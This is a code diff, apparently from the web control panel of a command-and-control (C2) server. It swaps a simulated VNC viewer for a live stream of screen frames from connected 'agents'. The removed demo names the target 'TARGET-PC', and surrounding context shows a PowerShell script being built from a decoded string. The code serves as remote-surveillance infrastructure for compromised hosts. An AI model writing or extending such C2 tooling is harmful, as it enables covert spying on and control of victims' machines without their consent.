@@ -1242,34 +1242,104 @@ $scriptBlock = [ScriptBlock]::Create($decoded)
 }
 
 // VNC Control Functions
-const startVncViewer = () => {
-  vncViewerActive.value = true
-  ElMessage.success('VNC viewer started')
+const startVncViewer = async () => {
+  try {
+    vncViewerActive.value = true
+    ElMessage.success('VNC viewer started')
+    
+    // Connect to real VNC stream from C2 server
+    await connectToVNCStream()
+    
+  } catch (error) {
+    console.error('Failed to start VNC viewer:', error)
+    ElMessage.error('Failed to start VNC viewer')
+    vncViewerActive.value = false
+  }
+}
+
+// Connect to VNC stream from C2 server
+const connectToVNCStream = async () => {
+  try {
+    // First check for active VNC connections
+    const response = await authenticatedFetch('/api/vnc/connections')
+    if (!response.ok) {
+      throw new Error(`Failed to get VNC connections: ${response.status}`)
+    }
+    
+    const data = await response.json()
+    if (data.connections && data.connections.length > 0) {
+      // Update connection info
+      const connection = data.connections[0]
+      vncConnected.value = true
+      vncAgentInfo.value = {
+        hostname: connection.hostname || 'Unknown',
+        ip: connection.agent_ip || 'Unknown',
+        resolution: connection.resolution || '200x150',
+        fps: connection.fps?.toString() || '5'
+      }
+      
+      // Start receiving frames
+      startVNCStream()
+    } else {
+      ElMessage.warning('No VNC agents currently connected')
+      vncConnected.value = false
+    }
+    
+  } catch (error) {
+    console.error('Failed to connect to VNC:', error)
+    ElMessage.error('Failed to connect to VNC stream')
+    vncConnected.value = false
+  }
+}
+
+// Start receiving VNC frames via Server-Sent Events
+const startVNCStream = () => {
+  const token = localStorage.getItem('auth_token')
   
-  // Simulate VNC connection for demo purposes
-  // In real implementation, this would connect to the C2 server's VNC endpoint
-  vncConnected.value = true
-  vncAgentInfo.value = {
-    hostname: 'TARGET-PC',
-    ip: '192.168.0.111',
-    resolution: '200x150',
-    fps: '5'
+  // Create EventSource with token in URL (EventSource doesn't support custom headers)
+  const eventSource = new EventSource(`/api/vnc/stream?token=${token}`)
+  
+  eventSource.onmessage = (event) => {
+    try {
+      const frame = JSON.parse(event.data)
+      processVNCFrame(frame)
+    } catch (error) {
+      console.error('Error processing VNC frame:', error)
+    }
   }
   
-  // Simulate frame updates
-  const frameInterval = setInterval(() => {
-    if (vncViewerActive.value) {
-      vncFrameCount.value++
-      vncCurrentFps.value = Math.floor(Math.random() * 5) + 3 // Random FPS between 3-7
-    } else {
-      clearInterval(frameInterval)
-    }
-  }, 200) // 5 FPS
+  eventSource.onerror = (error) => {
+    console.error('VNC stream error:', error)
+    ElMessage.error('VNC stream connection lost')
+    eventSource.close()
+  }
+  
+  // Store event source for cleanup
+  ;(window as any).vncEventSource = eventSource
+}
+
+// Process incoming VNC frame
+const processVNCFrame = (frame: any) => {
+  vncFrameCount.value++
+  const currentTime = Date.now()
+  const lastFrameTime = (window as any).lastFrameTime || currentTime
+  vncCurrentFps.value = Math.floor(1000 / (currentTime - lastFrameTime))
+  ;(window as any).lastFrameTime = currentTime
+  
+  // TODO: Render frame to canvas
+  // For now, just update the frame counter
+  console.log(`Received VNC frame: ${frame.size} bytes from ${frame.connection_id}`)
 }
 
 const stopVncViewer = () => {
   vncViewerActive.value = false
   ElMessage.success('VNC viewer stopped')
+  
+  // Close VNC stream
+  if ((window as any).vncEventSource) {
+    (window as any).vncEventSource.close()
+    ;(window as any).vncEventSource = null
+  }
   
   // Reset VNC state
   vncConnected.value = false
